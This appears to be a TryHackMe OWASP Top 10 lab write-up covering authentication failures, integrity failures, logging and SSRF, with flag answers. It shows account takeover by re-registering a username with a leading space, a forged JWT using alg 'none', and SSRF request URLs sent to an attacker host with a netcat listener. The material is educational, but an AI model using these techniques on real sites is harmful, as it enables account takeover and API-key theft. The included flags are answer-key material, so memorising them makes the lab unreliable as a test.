<img width="919" height="352" alt="image" src="https://github.com/user-attachments/assets/0f1d093e-6b27-45bc-9f84-802bbb15bc2f" />

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

**Module 16: 7. Identification and Authentication Failures**

<img width="1742" height="482" alt="image" src="https://github.com/user-attachments/assets/28f57b06-ce7c-4714-9f7a-66881dcf1b25" />

Authentication and session management constitute core components of modern web applications. Authentication allows users to gain access to web applications by verifying their identities. The most common form of authentication is using a username and password mechanism. A user would enter these credentials, and the server would verify them. The server would then provide the users' browser with a session cookie if they are correct. A session cookie is needed because web servers use HTTP(S) to communicate, which is stateless. Attaching session cookies means the server will know who is sending what data. The server can then keep track of users' actions. 

If an attacker is able to find flaws in an authentication mechanism, they might successfully gain access to other users' accounts. This would allow the attacker to access sensitive data (depending on the purpose of the application). Some common flaws in authentication mechanisms include the following:

- **_Brute force attacks_**: If a web application uses usernames and passwords, an attacker can try to launch brute force attacks that allow them to guess the username and passwords using multiple authentication attempts. 

- **_Use of weak credentials_**: Web applications should set strong password policies. If applications allow users to set passwords such as "password1" or common passwords, an attacker can easily guess them and access user accounts.

- **_Weak Session Cookies_**: Session cookies are how the server keeps track of users. If session cookies contain predictable values, attackers can set their own session cookies and access users' accounts. 

There can be various mitigation for broken authentication mechanisms depending on the exact flaw:

- To avoid password-guessing attacks, ensure the application enforces a strong password policy. 

- To avoid brute force attacks, ensure that the application enforces an automatic lockout after a certain number of attempts. This would prevent an attacker from launching more brute-force attacks.

- Implement Multi-Factor Authentication. If a user has multiple authentication methods, for example, using a username and password and receiving a code on their mobile device, it would be difficult for an attacker to get both the password and the code to access the account.

**Answer the questions below**

1. _I've understood broken authentication mechanisms._

Answer: No answer needed

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

**Module 17: Identification and Authentication Failures Practical**

For this example, we'll look at a logic flaw within the authentication mechanism.

Many times, what happens is that developers forget to sanitise the input(username & password) given by the user in the code of their application, which can make them vulnerable to attacks like SQL injection. However, we will focus on a vulnerability that happens because of a developer's mistake but is very easy to exploit, i.e. re-registration of an existing user.

Let's understand this with the help of an example, say there is an existing user with the name admin, and we want access to their account, so what we can do is try to re-register that username but with slight modification. We will enter " admin" without the quotes (notice the space at the start). Now when you enter that in the username field and enter other required information like email id or password and submit that data, it will register a new user, but that user will have the same right as the admin account. That new user will also be able to see all the content presented under the user admin.

To see this in action, go to http://MACHINE_IP:8088 and try to register with darren as your username. You'll see that the user already exists, so try to register " darren" instead, and you'll see that you are now logged in and can see the content present only in darren's account, which in our case, is the flag that you need to retrieve.

**Answer the questions below**

1. _What is the flag that you found in darren's account?_

Answer: ` fe86079416a21a3c99937fea8874b667 `

**_Explanation:_**

Visit http://MACHINE_IP:8088 and click on Register

<img width="1596" height="329" alt="image" src="https://github.com/user-attachments/assets/d648ad00-28b6-4b30-b9cf-d13538ea64a3" />

Now enter `" darren"` and give some data in the other fields in the register page

<img width="578" height="622" alt="image" src="https://github.com/user-attachments/assets/59bb4b1d-f572-42ac-b27b-c370fc5944be" />

We can see the user registered successfully

<img width="1917" height="225" alt="image" src="https://github.com/user-attachments/assets/edcf42c0-3ae8-4ad6-b4a9-a4fed2d4e3a9" />

Now we try to sign in with the new user and find the flag

<img width="1552" height="59" alt="image" src="https://github.com/user-attachments/assets/7b7180eb-4951-4c74-a34b-796d0f72e239" />

<img width="1545" height="121" alt="image" src="https://github.com/user-attachments/assets/4cb722f0-2eec-40fc-aa37-17f5ae2bc1ba" />


2. _Now try to do the same trick and see if you can log in as arthur._

Answer: No answer needed

**_Explanation:_**

Now enter `" aurthur"` and give some data in the other fields in the register page

<img width="567" height="595" alt="image" src="https://github.com/user-attachments/assets/8b53277e-d433-448d-99ed-15dfafaa4589" />


We can see the user registered successfully

<img width="1917" height="225" alt="image" src="https://github.com/user-attachments/assets/edcf42c0-3ae8-4ad6-b4a9-a4fed2d4e3a9" />

3. _What is the flag that you found in arthur's account?_

Answer: ` d9ac0f7db4fda460ac3edeb75d75e16e `

**_Explanation:_**

Now we try to sign in with the new user and find the flag

<img width="1537" height="64" alt="image" src="https://github.com/user-attachments/assets/a20beb44-559e-4310-925c-460df222746c" />

<img width="1540" height="124" alt="image" src="https://github.com/user-attachments/assets/f6028b30-1630-4219-9035-a3e5336bba68" />

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

**Module 18: 8. Software and Data Integrity Failures**

**What is Integrity?**

When talking about integrity, we refer to the capacity we have to ascertain that a piece of data remains unmodified. Integrity is essential in cybersecurity as we care about maintaining important data free from unwanted or malicious modifications. For example, say you are downloading the latest installer for an application. How can you be sure that while downloading it, it wasn't modified in transit or somehow got damaged by a transmission error?

To overcome this problem, you will often see a hash sent alongside the file so that you can prove that the file you downloaded kept its integrity and wasn't modified in transit. A hash or digest is simply a number that results from applying a specific algorithm over a piece of data. When reading about hashing algorithms, you will often read about MD5, SHA1, SHA256 or many others available.

Let's take WinSCP as an example to understand better how we can use hashes to check a file's integrity. If you go to their [Sourceforge repository](https://sourceforge.net/projects/winscp/files/WinSCP/5.21.5/), you'll see that for each file available to download, there are some hashes published along:

<img width="754" height="106" alt="image" src="https://github.com/user-attachments/assets/9d52c86a-0550-4b21-885b-e04b882f5a1c" />

These hashes were precalculated by the creators of WinSCP so that you can check the file's integrity after downloading. If we download the WinSCP-5.21.5-Setup.exe file, we can recalculate the hashes and compare them against the ones published in Sourceforge. To calculate the different hashes in Linux, we can use the following commands:

```
user@attackbox$ md5sum WinSCP-5.21.5-Setup.exe          
20c5329d7fde522338f037a7fe8a84eb  WinSCP-5.21.5-Setup.exe
                                                                                                                
user@attackbox$ sha1sum WinSCP-5.21.5-Setup.exe 
c55a60799cfa24c1aeffcd2ca609776722e84f1b  WinSCP-5.21.5-Setup.exe
                                                                                                                
user@attackbox$ sha256sum WinSCP-5.21.5-Setup.exe 
e141e9a1a0094095d5e26077311418a01dac429e68d3ff07a734385eb0172bea  WinSCP-5.21.5-Setup.exe
```

Since we got the same hashes, we can safely conclude that the file we downloaded is an exact copy of the one on the website.

Software and Data Integrity Failures

This vulnerability arises from code or infrastructure that uses software or data without using any kind of integrity checks. Since no integrity verification is being done, an attacker might modify the software or data passed to the application, resulting in unexpected consequences. There are mainly two types of vulnerabilities in this category:

- Software Integrity Failures

- Data Integrity Failures

**Answer the questions below**

1. _Read the above and continue!_

Answer: No answer needed

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

**Module 19: Software Integrity Failures**

Software Integrity Failures

Suppose you have a website that uses third-party libraries that are stored in some external servers that are out of your control. While this may sound a bit strange, this is actually a somewhat common practice. Take as an example jQuery, a commonly used javascript library. If you want, you can include jQuery in your website directly from their servers without actually downloading it by including the following line in the HTML code of your website:

`<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>`

When a user navigates to your website, its browser will read its HTML code and download jQuery from the specified external source.

<img width="1344" height="282" alt="image" src="https://github.com/user-attachments/assets/0f11f7db-1e48-454d-b312-daca207ada04" />

The problem is that if an attacker somehow hacks into the jQuery official repository, they could change the contents of https://code.jquery.com/jquery-3.6.1.min.js to inject malicious code. As a result, anyone visiting your website would now pull the malicious code and execute it into their browsers unknowingly. This is a software integrity failure as your website makes no checks against the third-party library to see if it has changed. Modern browsers allow you to specify a hash along the library's URL so that the library code is executed only if the hash of the downloaded file matches the expected value. This security mechanism is called Subresource Integrity (SRI), and you can read more about it [here](https://www.srihash.org/).

The correct way to insert the library in your HTML code would be to use SRI and include an integrity hash so that if somehow an attacker is able to modify the library, any client navigating through your website won't execute the modified version. Here's how that should look in HTML:

`<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>`

You can go to [https://www.srihash.org/](https://www.srihash.org/) to generate hashes for any library if needed.

**Answer the questions below**

1. _What is the SHA-256 hash of `https://code.jquery.com/jquery-1.12.4.min.js?`_

Answer: `sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=`

**_Explanation:_**

We visit https://www.srihash.org/ and then we enter `https://code.jquery.com/jquery-1.12.4.min.js` and select SHA-256 and see this hash

<img width="1103" height="427" alt="image" src="https://github.com/user-attachments/assets/66a7bfc3-6ebc-4aaf-afaf-43824089e38d" />

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

**Module 20: Data Integrity Failures**

﻿**Data Integrity Failures**

Let's think of how web applications maintain sessions. Usually, when a user logs into an application, they will be assigned some sort of session token that will need to be saved on the browser for as long as the session lasts. This token will be repeated on each subsequent request so that the web application knows who we are. These session tokens can come in many forms but are usually assigned via cookies. Cookies are key-value pairs that a web application will store on the user's browser and that will be automatically repeated on each request to the website that issued them.

<img width="403" height="130" alt="image" src="https://github.com/user-attachments/assets/a4832691-1e5b-486d-ab1d-22190773d65a" />

For example, if you were creating a webmail application, you could assign a cookie to each user after logging in that contains their username. In subsequent requests, your browser would always send your username in the cookie so that your web application knows what user is connecting. This would be a terrible idea security-wise because, as we mentioned, cookies are stored on the user's browser, so if the user tampers with the cookie and changes the username, they could potentially impersonate someone else and read their emails! This application would suffer from a data integrity failure, as it trusts data that an attacker can tamper with.

One solution to this is to use some integrity mechanism to guarantee that the cookie hasn't been altered by the user. To avoid re-inventing the wheel, we could use some token implementations that allow you to do this and deal with all of the cryptography to provide proof of integrity without you having to bother with it. One such implementation is JSON Web Tokens (JWT).

JWTs are very simple tokens that allow you to store key-value pairs on a token that provides integrity as part of the token. The idea is that you can generate tokens that you can give your users with the certainty that they won't be able to alter the key-value pairs and pass the integrity check. The structure of a JWT token is formed of 3 parts:

<img width="932" height="195" alt="image" src="https://github.com/user-attachments/assets/2d0f1e11-e7f6-4af9-bc01-ded14472dad7" />

The header contains metadata indicating this is a JWT, and the signing algorithm in use is HS256. The payload contains the key-value pairs with the data that the web application wants the client to store. The signature is similar to a hash, taken to verify the payload's integrity. If you change the payload, the web application can verify that the signature won't match the payload and know that you tampered with the JWT. Unlike a simple hash, this signature involves the use of a secret key held by the server only, which means that if you change the payload, you won't be able to generate the matching signature unless you know the secret key.

Notice that each of the 3 parts of the token is simply plaintext encoded with base64. You can use this online tool to encode/decode base64. Try decoding the header and payload of the following token:

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw`

Note: The signature contains binary data, so even if you decode it, you won't be able to make much sense of it anyways.

**JWT and the None Algorithm**

A data integrity failure vulnerability was present on some libraries implementing JWTs a while ago. As we have seen, JWT implements a signature to validate the integrity of the payload data. The vulnerable libraries allowed attackers to bypass the signature validation by changing the two following things in a JWT:

1. Modify the header section of the token so that the alg header would contain the value none.

2. Remove the signature part.

Taking the JWT from before as an example, if we wanted to change the payload so that the username becomes "admin" and no signature check is done, we would have to decode the header and payload, modify them as needed, and encode them back. Notice how we removed the signature part but kept the dot at the end.

<img width="751" height="211" alt="image" src="https://github.com/user-attachments/assets/305e6222-7e5f-4eac-8fad-106bd915bc9b" />

It sounds pretty simple! Let's walk through the process an attacker would have to follow in an example scenario. Navigate to http://MACHINE_IP:8089/ and follow the instructions in the questions below.

**Answer the questions below**

1. _Try logging into the application as guest. What is guest's account password?_

Answer: `guest`

**_Explanation:_**

We visit http://MACHINE_IP:8089/ and now we enter "guest" in the username and without giving the password we click enter

<img width="427" height="476" alt="image" src="https://github.com/user-attachments/assets/9f4941fd-6fcd-439b-b12d-598889fd0e7d" />

Now we can see that the application shows guest is the password for the username guest

<img width="445" height="536" alt="image" src="https://github.com/user-attachments/assets/d86fd897-2dd0-49da-9a8d-12bdc9765e48" />

If your login was successful, you should now have a JWT stored as a cookie in your browser. Press F12 to bring out the Developer Tools.

Depending on your browser, you will be able to edit cookies from the following tabs:

Firefox

<img width="1071" height="195" alt="image" src="https://github.com/user-attachments/assets/92b57545-f6b8-43fa-93e4-41376997c2cd" />

Chrome

<img width="1224" height="303" alt="image" src="https://github.com/user-attachments/assets/78cf0b93-a42a-42df-afeb-578a5ae8258b" />

2. _What is the name of the website's cookie containing a JWT token?_

Answer: `jwt-session`

**_Explanation:_**

We login as guest and now we open dev tools and go to the tab "Storage" (in Firefox) and we can see a token named "jwt-session"

<img width="1915" height="925" alt="image" src="https://github.com/user-attachments/assets/ccff12ff-963d-45f5-8f14-28f76f49ee4b" />

3. _Use the knowledge gained in this task to modify the JWT token so that the application thinks you are the user "admin"._

Answer: No answer needed

**_Explanation:_**

We copy the value of this token `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzU1NDMzODQyfQ.1MsCAzV2hu5hIoQflbhEpeAWl0GvR_BOvqIFddkBloQ`

<img width="1139" height="930" alt="image" src="https://github.com/user-attachments/assets/d9fe9ae1-6b9a-4680-926a-37e7357e582b" />

Now we decode this token using https://www.base64decode.org/
 
<img width="970" height="492" alt="image" src="https://github.com/user-attachments/assets/fdba969a-a22e-4f32-8a0e-39b6fbe3c4a3" />

We can see the plain text values and we change the following:

1. alg -> from `HS256` to `none`

2. username -> `guest` to `admin`

3. Remove the signature part

<img width="394" height="34" alt="image" src="https://github.com/user-attachments/assets/eec9aa30-6b98-41d7-9d91-1be096919175" />

Now we try to encode each part separately

First we encode `{"typ":"JWT","alg":"none"}` using https://www.base64encode.org/ and we get `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=` and we add a period (".") at the end of this encoded string so it changes to `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.`

<img width="628" height="591" alt="image" src="https://github.com/user-attachments/assets/eca6d602-2240-424c-9f01-134048eee226" />

Now we encode the second part `{"username":"admin","exp":1755433390}` and we get `eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzU1NDMzMzkwfQ==` and we add a period (".") at the end of this encoded string so it changes to `eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzU1NDMzMzkwfQ==.`

<img width="609" height="608" alt="image" src="https://github.com/user-attachments/assets/6d03c242-deff-4d3b-ad0b-7c9005bd2124" />

Now we combine the encdoed string 1 `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.` along with encoded string 2 `eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzU1NDMzMzkwfQ==.` without any space like `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzU1NDMzMzkwfQ==.` and now we paste it in the JWT token session

<img width="776" height="269" alt="image" src="https://github.com/user-attachments/assets/0b2e4087-7c80-4ea9-b663-b57913a3692d" />

3. _What is the flag presented to the admin user?_

Answer: `THM{Dont_take_cookies_from_strangers}`

**_Explanation:_**

We will now refresh the page and get our flag

<img width="420" height="127" alt="image" src="https://github.com/user-attachments/assets/bd676da2-5310-4872-9e2e-ae7fcc2db51c" />

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

**Module 21: 9. Security Logging and Monitoring Failures**

When web applications are set up, every action performed by the user should be logged. Logging is important because, in the event of an incident, the attackers' activities can be traced. Once their actions are traced, their risk and impact can be determined. Without logging, there would be no way to tell what actions were performed by an attacker if they gain access to particular web applications. The more significant impacts of these include:

- **_Regulatory damage_**: if an attacker has gained access to personally identifiable user information and there is no record of this, final users are affected, and the application owners may be subject to fines or more severe actions depending on regulations.

- **_Risk of further attacks_**: an attacker's presence may be undetected without logging. This could allow an attacker to launch further attacks against web application owners by stealing credentials, attacking infrastructure and more.

The information stored in logs should include the following:

- HTTP status codes

- Time Stamps

- Usernames

- API endpoints/page locations

- IP addresses

These logs have some sensitive information, so it's important to ensure that they are stored securely and that multiple copies of these logs are stored at different locations.

As you may have noticed, logging is more important after a breach or incident has occurred. The ideal case is to have monitoring in place to detect any suspicious activity. The aim of detecting this suspicious activity is to either stop the attacker completely or reduce the impact they've made if their presence has been detected much later than anticipated. Common examples of suspicious activity include:

- Multiple unauthorised attempts for a particular action (usually authentication attempts or access to unauthorised resources, e.g. admin pages)

- Requests from anomalous IP addresses or locations: while this can indicate that someone else is trying to access a particular user's account, it can also have a false positive rate.

- Use of automated tools: particular automated tooling can be easily identifiable, e.g. using the value of User-Agent headers or the speed of requests. This can indicate that an attacker is using automated tooling.

- Common payloads: in web applications, it's common for attackers to use known payloads. Detecting the use of these payloads can indicate the presence of someone conducting unauthorised/malicious testing on applications.

Just detecting suspicious activity isn't helpful. This suspicious activity needs to be rated according to the impact level. For example, certain actions will have a higher impact than others. These higher-impact actions need to be responded to sooner; thus, they should raise alarms to get the relevant parties' attention.

Put this knowledge to practice by analysing the provided sample log file. You can download it by clicking the Download Task Files button at the top of the task.

**Answer the questions below**

1. _What IP address is the attacker using?_

Answer: `49.99.13.16`

**_Explanation:_**

We will download the  files in the task and open it using any text editor

From the logs, we can see the IP address `49.99.13.16` is having status code 401 (Unauthorised) and trying to log in as `Admin`, `Adminstrator`, `Anonymous` and `root`

<img width="608" height="209" alt="image" src="https://github.com/user-attachments/assets/2bff5efe-977c-4f41-80b2-d4a4a3465481" />


2. _What kind of attack is being carried out?_

Answer: `Brute Force`

**_Explanation:_**

The attacker is trying multiple user names so it's a brute force attack

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

**Module 22: 10. Server-Side Request Forgery (SSRF)**

**Server-Side Request Forgery**

This type of vulnerability occurs when an attacker can coerce a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself. SSRF vulnerabilities often arise from implementations where our web application needs to use third-party services.

Think, for example, of a web application that uses an external API to send SMS notifications to its clients. For each email, the website needs to make a web request to the SMS provider's server to send the content of the message to be sent. Since the SMS provider charges per message, they require you to add a secret key, which they pre-assign to you, to each request you make to their API. The API key serves as an authentication token and allows the provider to know to whom to bill each message. The application would work like this:

<img width="1635" height="843" alt="image" src="https://github.com/user-attachments/assets/e95ba977-3723-43f4-95fa-03d8f4e9c1ea" />

By looking at the diagram above, it is easy to see where the vulnerability lies. The application exposes the server parameter to the users, which defines the server name of the SMS service provider. If the attacker wanted, they could simply change the value of the server to point to a machine they control, and your web application would happily forward the SMS request to the attacker instead of the SMS provider. As part of the forwarded message, the attacker would obtain the API key, allowing them to use the SMS service to send messages at your expense. To achieve this, the attacker would only need to make the following request to your website:

`https://www.mysite.com/sms?server=attacker.thm&msg=ABC`

This would make the vulnerable web application make a request to:

`https://attacker.thm/api/send?msg=ABC `

You could then just capture the contents of the request using Netcat:

```
user@attackbox$ nc -lvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.1.236 43830
GET /:8087/public-docs/123.pdf HTTP/1.1
Host: 10.10.10.11
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: */*
```

This is a really basic case of SSRF. If this doesn't look that scary, SSRF can actually be used to do much more. In general, depending on the specifics of each scenario, SSRF can be used for:

- Enumerate internal networks, including IP addresses and ports.

- Abuse trust relationships between servers and gain access to otherwise restricted services.

- Interact with some non-HTTP services to get remote code execution (RCE).

Let's quickly look at how we can use SSRF to abuse some trust relationships.

**Practical Example**

Navigate to http://MACHINE_IP:8087/, where you'll find a simple web application. After exploring a bit, you should see an admin area, which will be our main objective. Follow the instructions on the following questions to gain access to the website's restricted area!

**Answer the questions below**

1. _Explore the website. What is the only host allowed to access the admin area?_

Answer: `localhost`

**_Explanation_**

We visit http://MACHINE_IP:8087/ and we see a hamburger menu and when we click on that we see a section called "Admin Area" 

<img width="1150" height="534" alt="image" src="https://github.com/user-attachments/assets/d6b81899-7174-4f81-a62b-86db9b199170" />

and when we click on that, we can see it can be accessed only from `localhost`

<img width="542" height="125" alt="image" src="https://github.com/user-attachments/assets/eebb1583-25b2-43e6-b87b-4bc6b3b688f0" />

2. _Check the "Download Resume" button. Where does the server parameter point to?_

Answer: `secure-file-storage.com`

**_Explanation_**

When we right click on "Download Resume" button we can see the  server parameter as

<img width="1141" height="37" alt="image" src="https://github.com/user-attachments/assets/32a565d4-7fc3-4007-9905-271a78fa1301" />


3. _Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request?_

Answer: `THM{Hello_Im_just_an_API_key}`

**_Explanation_**

We open a netcat listener on our local machine ` nc -lvp 8000`

<img width="322" height="135" alt="image" src="https://github.com/user-attachments/assets/d2c96240-3dcb-4c62-8635-345986061dfe" />

Now we hit `http://MACHINE_IP:8087/download?server=YOUR-IP:8000&id=75482342` on the browser and we can see the flag in netcat listener

<img width="910" height="365" alt="image" src="https://github.com/user-attachments/assets/e1266382-7f5d-45a2-b4c3-7308c03d641a" />


4. Going the Extra Mile: There's a way to use SSRF to gain access to the site's admin area. Can you find it? 

Note: You won't need this flag to progress in the room. You are expected to do some research in order to achieve your goal.

Answer: No answer needed

**_Explanation_**

We use the URL `https://MACHINE_IP:8087/download?server=http://localhost:8087/admin%23&id=75482342` 

and we get the flag

<img width="1018" height="894" alt="image" src="https://github.com/user-attachments/assets/42fd4f94-1e06-494f-94b2-1c12048e1b13" />

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

**Module 23: What Next?**

What Next?

Why not enroll in our [beginner-level pathway](https://tryhackme.com/path/outline/cybersecurity101) or find [another room](https://tryhackme.com/hacktivities) to complete?

**Answer the questions below**

1. _Read the above!_

Answer: No answer needed

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
